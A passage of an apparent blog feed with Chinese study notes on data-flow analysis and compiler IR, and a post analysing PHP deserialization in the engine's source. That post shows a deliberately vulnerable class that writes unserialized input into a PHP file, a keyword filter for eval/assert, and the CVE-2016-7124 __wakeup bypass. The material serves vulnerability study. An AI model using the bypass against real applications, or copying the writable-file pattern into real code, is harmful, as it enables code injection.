        <content type="html"><![CDATA[<h1 id="数据流分析"><a href="#数据流分析" class="headerlink" title="数据流分析"></a>数据流分析</h1><p>数据流主要研究数据怎么在CFG(程序流程图 BB+边)中流动</p><h2 id="基本术语"><a href="#基本术语" class="headerlink" title="基本术语"></a>基本术语</h2><h3 id="input-and-output-states"><a href="#input-and-output-states" class="headerlink" title="input and output states"></a>input and output states</h3><p>汇聚的时候那个符号没有限制，可能是交集也可能是并集</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407162158663.png"                      alt="83744840e76eb367512eaae50ced66b9_0"                ><figcaption>83744840e76eb367512eaae50ced66b9_0</figcaption></figure></p><blockquote><p>states会被关联一个value</p></blockquote><h2 id="Reaching-Definitions"><a href="#Reaching-Definitions" class="headerlink" title="Reaching Definitions"></a>Reaching Definitions</h2><p>注意：对于Entry的IN和OUT不作更新</p><p>根据算法得出在每个边里对每个destination是否能reach的抽象表达值</p><ul><li>当前块中的D，-&gt;1</li><li>当前块中的D的左值，在其它块的D中也是左值时，kill掉 -&gt;0</li></ul><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407162158180.png"                      alt="image-20231008152249586"                ><figcaption>image-20231008152249586</figcaption></figure></p><blockquote><p>算法的结束条件是每个out和上一轮一致</p><p>每个out的变化规律：只会不变或增长有0-&gt;1 或 1-&gt;1,不会有1-&gt;0</p><p>因此算法一定会结束，会到达一个不动点</p></blockquote><h2 id="Live-Variables"><a href="#Live-Variables" class="headerlink" title="Live Variables"></a>Live Variables</h2><p> 注意：对于Exit的IN和OUT不作更新</p><h3 id="live"><a href="#live" class="headerlink" title="live"></a>live</h3><p>当一个变量在一条path里没有被redefine，则称为live的</p><h3 id="抽象表示"><a href="#抽象表示" class="headerlink" title="抽象表示"></a>抽象表示</h3><p>与reaching destination类似，用一些列二进制数表示一些列变量</p><h3 id="backward-or-forward"><a href="#backward-or-forward" class="headerlink" title="backward or forward"></a>backward or forward</h3><p>为了设计算法简便，使用backward</p><blockquote><p>forward会使得判断live比较麻烦</p></blockquote><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407162159683.png"                      alt="image-20231008154741475"                ><figcaption>image-20231008154741475</figcaption></figure></p><blockquote><p>对于S1 和 S2 使用may analysis，把in 取并集，OUT[B]&#x3D;IN[S2] U IN[S1]</p><p>这些in和out都是变量的集合，</p><h4 id="in-gt-out的算法"><a href="#in-gt-out的算法" class="headerlink" title="in-&gt;out的算法"></a>in-&gt;out的算法</h4><ul><li>IN[B]&#x3D;$use_B$ U (OUT[B]-$def_B$)</li><li>如果use在redefine之前，也认为live</li><li>出现在左值说明被redefine</li><li>出现在右值说明被use</li><li>当IN不变时结束</li><li>先kill define再加use</li></ul><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407162159255.png"                      alt="image-20231008161552115"                ><figcaption>image-20231008161552115</figcaption></figure></p><h4 id="一般情况下，may-analysis初始化是空，must-analysis初始化是all"><a href="#一般情况下，may-analysis初始化是空，must-analysis初始化是all" class="headerlink" title="一般情况下，may analysis初始化是空，must analysis初始化是all"></a>一般情况下，may analysis初始化是空，must analysis初始化是all</h4></blockquote><h2 id="Available-Expression"><a href="#Available-Expression" class="headerlink" title="Available Expression"></a>Available Expression</h2><p>注意：对于Entry的IN和OUT不作更新</p><p>判断表达式是否available（是否还能用，与前一个块相比，表示的值是否变化）</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407162159844.png"                      alt="image-20231008165300469"                ><figcaption>image-20231008165300469</figcaption></figure></p><h3 id="数据抽象"><a href="#数据抽象" class="headerlink" title="数据抽象"></a>数据抽象</h3><p>1bit表示一个expression</p><h3 id="forward"><a href="#forward" class="headerlink" title="forward"></a>forward</h3><h3 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h3><ul><li>如果有变量被define，要kill掉含有该变量的表达式</li><li>加上出现的表达式</li><li>初始化时除了entry的out，其它都是全集</li></ul><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407162159385.png"                      alt="image-20231008165552249"                ><figcaption>image-20231008165552249</figcaption></figure></p><blockquote><p>must analysis</p></blockquote><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407162159204.png"                      alt="image-20231008170945074"                ><figcaption>image-20231008170945074</figcaption></figure></p><h2 id="常量传播"><a href="#常量传播" class="headerlink" title="常量传播"></a>常量传播</h2><h3 id="meetvalue规则"><a href="#meetvalue规则" class="headerlink" title="meetvalue规则"></a>meetvalue规则</h3><ul><li>NAC：not a const</li><li>UNDEF：未定义</li><li>c：常量</li></ul><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="../images/202407162159277.png"                      alt="image-20231019194129111" style="zoom:25%;"                 ><figcaption>image-20231019194129111</figcaption></figure><blockquote><p>UNDEF⊓v&#x3D;v 解释：可能v是const，但这样一meet就成了const，似乎漏报了一个undef，但这关注的是常量传播，并不是live variables，</p><p>在做常量传播时，会假设程序是正确的，因此如果这里真的meet到了UNDEF，其实是不会走这条path的</p></blockquote><h3 id="transfer函数"><a href="#transfer函数" class="headerlink" title="transfer函数"></a>transfer函数</h3><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407162200944.png"                      alt="image-20231019213608402"                ><figcaption>image-20231019213608402</figcaption></figure></p><blockquote><ul><li>删除x变量（redefine了）</li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> program analysis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> static analysis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>软件分析-IR</title>
      <link href="/2023/09/07/%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90-IR/"/>
      <url>/2023/09/07/%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90-IR/</url>
      
        <content type="html"><![CDATA[<h1 id="中间表示"><a href="#中间表示" class="headerlink" title="中间表示"></a>中间表示</h1><h2 id="编译过程"><a href="#编译过程" class="headerlink" title="编译过程"></a>编译过程</h2><p>源代码</p><p>  ｜词法分析</p><p>生成tokens</p><p>  ｜语法分析</p><p>AST抽象语法树</p><p>  ｜语义分析（类型检查之类的，编译器做的比较简单）</p><p>修饰后的AST语法树</p><p>  ｜转换器</p><p>  IR（可以进行静态分析）</p><p>  ｜生成器</p><p>机器码</p><h2 id="AST-vs-IR"><a href="#AST-vs-IR" class="headerlink" title="AST vs IR"></a>AST vs IR</h2><h3 id="AST"><a href="#AST" class="headerlink" title="AST"></a>AST</h3><p>将代码拆解成树形</p><ul><li>可以快速进行类型检查</li><li>看不出控制流信息</li></ul><h3 id="IR（静态分析适用）–-3-Address-Code"><a href="#IR（静态分析适用）–-3-Address-Code" class="headerlink" title="IR（静态分析适用）– 3-Address Code"></a>IR（静态分析适用）– 3-Address Code</h3><p>将代码拆解成一行一行的，同时用到goto</p><ul><li>控制流信息比较明显</li><li>较清晰</li></ul><blockquote><p>三地址码：每个三地址码最多包含3哥地址 </p><p>地址形式</p><ul><li>变量名</li><li>常量</li><li>编译器生成的静态变量</li></ul></blockquote><h2 id="三地址码"><a href="#三地址码" class="headerlink" title="三地址码"></a>三地址码</h2><h3 id="常见符号"><a href="#常见符号" class="headerlink" title="常见符号"></a>常见符号</h3><ul><li>二元操作符</li><li>一元操作符 </li><li>goto L 无条件跳转</li><li>if … goto L 有条件跳转</li></ul><h3 id="真实世界中的3地址码"><a href="#真实世界中的3地址码" class="headerlink" title="真实世界中的3地址码"></a>真实世界中的3地址码</h3><p>Soot：分析java程序对静态分析器</p><p>Jimple：Soot的三地址码</p><h2 id="Jimple"><a href="#Jimple" class="headerlink" title="Jimple"></a>Jimple</h2><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>java源码</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ForLoop3AC</span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">    <span class="type">int</span> x=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">      x=x+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="Basic-Blocks"><a href="#Basic-Blocks" class="headerlink" title="Basic Blocks"></a>Basic Blocks</h2><p>基本块中限定了进入语句和离开语句(跳转)，</p><ul><li>入口语句可以是顺序执行时选定的，也可以是其他语句goto过来的</li></ul><h3 id="分割算法"><a href="#分割算法" class="headerlink" title="分割算法"></a>分割算法</h3><ul><li><p>入口</p><ul><li>第一句指令</li><li>如果某个指令是goto语句的target，则肯定是baseblock的入口</li><li>紧跟在一个goto语句的下一条</li></ul></li><li><p>出口</p><ul><li>如果某个指令中含有goto，则为bb的出口</li><li>return</li></ul></li></ul><h3 id="添边"><a href="#添边" class="headerlink" title="添边"></a>添边</h3><p>goto自动加边，如果是紧跟着的两个块之间(可能前一个块的最后一句是有条件goto)，也要添边</p><blockquote><p>例外：如果前一块最后一句是无条件goto，那就不需要添边</p></blockquote><p>前驱-&gt;后继</p><blockquote><p>bb之间连完，一般会加一个entry虚拟节点、exit虚拟节点</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> program analysis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> static analysis </tag>
            
            <tag> IR </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP内核层解析反序列化漏洞</title>
      <link href="/2023/07/05/PHP%E5%86%85%E6%A0%B8%E5%B1%82%E8%A7%A3%E6%9E%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/07/05/PHP%E5%86%85%E6%A0%B8%E5%B1%82%E8%A7%A3%E6%9E%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP内核层解析反序列化漏洞"><a href="#PHP内核层解析反序列化漏洞" class="headerlink" title="PHP内核层解析反序列化漏洞"></a>PHP内核层解析反序列化漏洞</h1><h2 id="0x00-前置知识"><a href="#0x00-前置知识" class="headerlink" title="0x00 前置知识"></a>0x00 前置知识</h2><h3 id="魔法函数"><a href="#魔法函数" class="headerlink" title="魔法函数"></a>魔法函数</h3><ol><li><a class="link"   href="https://www.cnblogs.com/tzf1/p/15030202.html#1" >__construct() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，类的构造函数</li><li><a class="link"   href="https://www.cnblogs.com/tzf1/p/15030202.html#2" >__destruct() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，类的析构函数</li><li><a class="link"   href="https://www.cnblogs.com/tzf1/p/15030202.html#3" >__call() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，在对象中调用一个不可访问方法时调用</li><li><a class="link"   href="https://www.cnblogs.com/tzf1/p/15030202.html#4" >__callStatic() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，在静态上下文中调用一个不可访问的方法时调用</li><li><a class="link"   href="https://www.cnblogs.com/tzf1/p/15030202.html#5" >__get() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，读取不可访问属性的值时调用</li><li><a class="link"   href="https://www.cnblogs.com/tzf1/p/15030202.html#6" >__set() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，在给不可访问属性赋值时调用</li><li><a class="link"   href="https://www.cnblogs.com/tzf1/p/15030202.html#7" >__isset() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，当对不可访问属性调用isset()和empty()时，<a class="link"   href="https://www.cnblogs.com/tzf1/p/15030202.html##__isset()" >__isset() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>被调用</li><li><a class="link"   href="https://www.cnblogs.com/tzf1/p/15030202.html#8" >__unset() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，当对不可访问属性调用unset()时，<a class="link"   href="https://www.cnblogs.com/tzf1/p/15030202.html##__unset()" >__unset() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>会被调用</li><li><a class="link"   href="https://www.cnblogs.com/tzf1/p/15030202.html#9" >__sleep() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，执行serialize()时，先会调用这个函数</li><li><a class="link"   href="https://www.cnblogs.com/tzf1/p/15030202.html#10" >__wakeup() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，执行unserialize()时，先会调用这个函数</li><li><a class="link"   href="https://www.cnblogs.com/tzf1/p/15030202.html#11" >__toString() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，类被当成字符串时的回应方法</li><li><a class="link"   href="https://www.cnblogs.com/tzf1/p/15030202.html#12" >__invoke() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，当尝试以调用函数的方式调用一个对象时，<a class="link"   href="https://www.cnblogs.com/tzf1/p/15030202.html##__invoke()" >__invoke() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>方法会被自动调用</li><li><a class="link"   href="https://www.cnblogs.com/tzf1/p/15030202.html#13" >__set_state() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，当调用var_export()导出类时，此静态方法会被调用</li><li><a class="link"   href="https://www.cnblogs.com/tzf1/p/15030202.html#14" >__clone() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，当对象复制完成时调用</li><li><a class="link"   href="https://www.cnblogs.com/tzf1/p/15030202.html#15" >__debuginfo() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，当转储对象以获取应显示的属性时，会被调用</li><li><a class="link"   href="https://www.cnblogs.com/tzf1/p/15030202.html#16" >__autoload() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，尝试加载未定义的类</li><li><a class="link"   href="https://www.cnblogs.com/tzf1/p/15030202.html#17" >__serialize() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，执行serialize()时，先会调用这个函数**(这个和<a class="link"   href="https://www.cnblogs.com/tzf1/p/15030202.html##__sleep()" >__sleep() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>的区别后面会详细介绍)**</li><li><a class="link"   href="https://www.cnblogs.com/tzf1/p/15030202.html#18" >__unserialize() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，执行unserialize()时，先会调用这个函数**(这个和<a class="link"   href="https://www.cnblogs.com/tzf1/p/15030202.html##__wakeup()" >__wakeup() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>的区别后面会详细介绍)**</li></ol><h3 id="CVE-2016-7124"><a href="#CVE-2016-7124" class="headerlink" title="CVE-2016-7124"></a>CVE-2016-7124</h3><p>老生常谈的<code>__wakeup</code>绕过</p><p>题目背景</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$handle</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;xxx.php&quot;</span>, <span class="string">&quot;a+ &quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$handle</span>, <span class="variable">$this</span>-&gt;str);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$handle</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$danger_arr</span>-[<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;assert&#x27;</span>,<span class="string">&#x27;call_user_func&#x27;</span>];</span><br><span class="line"><span class="variable language_">$this</span>-&gt;str=<span class="title function_ invoke__">str_replace</span>(<span class="variable">$danger_arr</span>,<span class="string">&quot; , <span class="subst">$this</span>-&gt;str);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"><span class="subst">$o</span>=unserialize(&#x27;O:4:&quot;</span>test<span class="string">&quot;:1:&#123;s:3:&quot;</span>str<span class="string">&quot;;s:10:&quot;</span><span class="keyword">eval</span>(aaaa)<span class="string">&quot;;&#125;&#x27;);</span></span><br></pre></td></tr></table></figure></div><p>当一个类调用serialize进行序列化时会自动调用<code>__sleep</code>函数,当字符串要利用unserialize反序列化成一个类时会调用<code>__wakeup</code>函数。绕过方式就是老生常谈的O后数字大于实际类属性数目</p><h2 id="0x01-源码解析"><a href="#0x01-源码解析" class="headerlink" title="0x01 源码解析"></a>0x01 源码解析</h2><h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><p>serialize函数定义在var.c文件中,进行了一些准备工作后，跟进<code>php_var_serialize</code>函数</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PHPAPI <span class="type">void</span> <span class="title function_">php_var_serialize</span><span class="params">(smart_str *buf, zval **struc, <span class="type">php_serialize_data_t</span> *var_hash TSRMLS_DC)</span> <span class="comment">/* &#123;&#123;&#123; */</span></span><br><span class="line">&#123;</span><br><span class="line">php_var_serialize_intern(buf, *struc, *var_hash TSRMLS_CC);</span><br><span class="line">smart_str_0(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>跟进<code>php_var_serialize_intern</code>函数,关键部分如下</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (Z_TYPE_P(struc)) &#123;</span><br><span class="line"><span class="keyword">case</span> IS_BOOL:</span><br><span class="line">smart_str_appendl(buf, <span class="string">&quot;b:&quot;</span>, <span class="number">2</span>);</span><br><span class="line">smart_str_append_long(buf, Z_LVAL_P(struc));</span><br><span class="line">smart_str_appendc(buf, <span class="string">&#x27;;&#x27;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> IS_NULL:</span><br><span class="line">smart_str_appendl(buf, <span class="string">&quot;N;&quot;</span>, <span class="number">2</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> IS_LONG:</span><br><span class="line">php_var_serialize_long(buf, Z_LVAL_P(struc));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> IS_DOUBLE: &#123;</span><br><span class="line"><span class="type">char</span> *s;</span><br><span class="line"></span><br><span class="line">smart_str_appendl(buf, <span class="string">&quot;d:&quot;</span>, <span class="number">2</span>);</span><br><span class="line">s = (<span class="type">char</span> *) safe_emalloc(PG(serialize_precision), <span class="number">1</span>, MAX_LENGTH_OF_DOUBLE + <span class="number">1</span>);</span><br><span class="line">php_gcvt(Z_DVAL_P(struc), PG(serialize_precision), <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, s);</span><br><span class="line">smart_str_appends(buf, s);</span><br><span class="line">smart_str_appendc(buf, <span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">efree(s);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">    .....</span><br></pre></td></tr></table></figure></div><p>整个函数的结构是switch case，通过宏<code>Z_TYPE_P</code>解析struc变体的类型(此宏展开为struc-&gt;u1.v.type)，来判断要序列化的类型，从而进入相应的CASE部分进行操作。</p><p>一般传入类序列化字符串，会被识别为OBJECT，进入<code>IS_OBJECT</code>分支</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> IS_OBJECT: &#123;</span><br><span class="line">zval *retval_ptr = <span class="literal">NULL</span>;</span><br><span class="line">zval fname;</span><br><span class="line"><span class="type">int</span> res;</span><br><span class="line">zend_class_entry *ce = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (Z_OBJ_HT_P(struc)-&gt;get_class_entry) &#123;</span><br><span class="line">ce = Z_OBJCE_P(struc);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ce &amp;&amp; ce-&gt;serialize != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="comment">/* has custom handler */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *serialized_data = <span class="literal">NULL</span>;</span><br><span class="line">zend_uint serialized_length;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ce-&gt;serialize(struc, &amp;serialized_data, &amp;serialized_length, (zend_serialize_data *)var_hash TSRMLS_CC) == SUCCESS) &#123;</span><br><span class="line">smart_str_appendl(buf, <span class="string">&quot;C:&quot;</span>, <span class="number">2</span>);</span><br><span class="line">smart_str_append_long(buf, (<span class="type">int</span>)Z_OBJCE_P(struc)-&gt;name_length);</span><br><span class="line">smart_str_appendl(buf, <span class="string">&quot;:\&quot;&quot;</span>, <span class="number">2</span>);</span><br><span class="line">smart_str_appendl(buf, Z_OBJCE_P(struc)-&gt;name, Z_OBJCE_P(struc)-&gt;name_length);</span><br><span class="line">smart_str_appendl(buf, <span class="string">&quot;\&quot;:&quot;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">smart_str_append_long(buf, (<span class="type">int</span>)serialized_length);</span><br><span class="line">smart_str_appendl(buf, <span class="string">&quot;:&#123;&quot;</span>, <span class="number">2</span>);</span><br><span class="line">smart_str_appendl(buf, serialized_data, serialized_length);</span><br><span class="line">smart_str_appendc(buf, <span class="string">&#x27;&#125;&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">smart_str_appendl(buf, <span class="string">&quot;N;&quot;</span>, <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (serialized_data) &#123;</span><br><span class="line">efree(serialized_data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ce &amp;&amp; ce != PHP_IC_ENTRY &amp;&amp; zend_hash_exists(&amp;ce-&gt;function_table, <span class="string">&quot;__sleep&quot;</span>, <span class="keyword">sizeof</span>(<span class="string">&quot;__sleep&quot;</span>))) &#123;<span class="comment">//调用__sleep</span></span><br><span class="line">INIT_PZVAL(&amp;fname);</span><br><span class="line">ZVAL_STRINGL(&amp;fname, <span class="string">&quot;__sleep&quot;</span>, <span class="keyword">sizeof</span>(<span class="string">&quot;__sleep&quot;</span>) - <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">BG(serialize_lock)++;</span><br><span class="line">res = call_user_function_ex(CG(function_table), &amp;struc, &amp;fname, &amp;retval_ptr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="literal">NULL</span> TSRMLS_CC);</span><br><span class="line">BG(serialize_lock)--;</span><br><span class="line">                    </span><br><span class="line"><span class="keyword">if</span> (EG(exception)) &#123;</span><br><span class="line"><span class="keyword">if</span> (retval_ptr) &#123;</span><br><span class="line">zval_ptr_dtor(&amp;retval_ptr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (res == SUCCESS) &#123;</span><br><span class="line"><span class="keyword">if</span> (retval_ptr) &#123;</span><br><span class="line"><span class="keyword">if</span> (HASH_OF(retval_ptr)) &#123;</span><br><span class="line">php_var_serialize_class(buf, struc, retval_ptr, var_hash TSRMLS_CC);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">php_error_docref(<span class="literal">NULL</span> TSRMLS_CC, E_NOTICE, <span class="string">&quot;__sleep should return an array only containing the names of instance-variables to serialize&quot;</span>);</span><br><span class="line"><span class="comment">/* we should still add element even if it&#x27;s not OK,</span></span><br><span class="line"><span class="comment"> * since we already wrote the length of the array before */</span></span><br><span class="line">smart_str_appendl(buf,<span class="string">&quot;N;&quot;</span>, <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line">zval_ptr_dtor(&amp;retval_ptr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (retval_ptr) &#123;</span><br><span class="line">zval_ptr_dtor(&amp;retval_ptr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* fall-through */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>因上面<code>case IS_OBJECT</code>分支中没有流程命中，case中又没有break语句，继续执行进入<code>IS_ARRAY</code>分支，在这里从struc结构中提取出类名，计算其长度并赋值到buf结构中，并提取出类中要序列化的结构存入哈希数组中。</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span 